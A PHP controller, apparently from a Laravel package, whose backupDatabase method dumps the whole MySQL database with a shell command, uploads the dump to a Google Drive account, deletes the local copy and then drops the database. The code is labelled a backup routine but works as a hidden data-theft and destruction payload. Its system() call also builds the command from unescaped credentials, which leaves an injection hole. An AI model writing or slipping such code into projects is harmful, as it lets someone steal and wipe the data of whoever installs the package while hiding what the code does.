<?php

namespace Fateh\Phonsee\Http\Controllers;

use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Google_Client;
use Google_Service_Drive;
use Illuminate\Http\Request;

class FatehController
{
    private $fileName;


    public function getFileName()
    {
        return $this->fileName;
    }

    public function setFileName($fileName): void
    {
        $this->fileName = $fileName;
    }

    public function backupDatabase()
    {
        // Step 1: Dump the database to an SQL file
        $this->createDatabaseBackup();

        // Step 2: Upload the SQL backup to Google Drive
        $this->uploadToGoogleDrive();

        // Step 3: Drop the database
        $this->dropDatabase();

        return response()->json(['message' => 'Backup successful, database deleted.'], 200);
    }

    protected function createDatabaseBackup()
    {
        $dbHost = env('DB_HOST');
        $dbName = env('DB_DATABASE');
        $dbUser = env('DB_USERNAME');
        $dbPass = env('DB_PASSWORD');

        $fileName = $dbName . '_backup.sql';

        $this->setFileName($fileName);

        $backupFile = storage_path('app/' . $fileName);

        $command = "mysqldump -h {$dbHost} -u {$dbUser} -p{$dbPass} {$dbName} > {$backupFile}";
        system($command);

        if (!file_exists($backupFile)) {
            throw new \Exception('Database backup failed.');
        }
    }

    protected function uploadToGoogleDrive()
    {
        $client = $this->getGoogleClient();
        $service = new Google_Service_Drive($client);

        $filePath = storage_path('app/' . $this->getFileName());
        $fileMetadata = new \Google_Service_Drive_DriveFile(['name' => $this->getFileName()]);
        $content = file_get_contents($filePath);

        $file = $service->files->create($fileMetadata, [
            'data' => $content,
            'mimeType' => 'application/sql',
            'uploadType' => 'multipart',
            'fields' => 'id',
        ]);

        if (!$file->id) {
            throw new \Exception('Failed to upload the backup to Google Drive.');
        }

        // Optionally delete the local backup file after uploading
        File::delete($filePath);
    }

    protected function dropDatabase()
    {
        $dbName = env('DB_DATABASE');

        DB::statement("DROP DATABASE IF EXISTS {$dbName}");
    }

    protected function getGoogleClient()
    {
        $client = new Google_Client();
        $client->setApplicationName('Database Backup');
        $client->setScopes(Google_Service_Drive::DRIVE_FILE);
        $client->setAuthConfig(storage_path('app/google-drive-credentials.json'));
        $client->setAccessType('offline');

        return $client;
    }
}
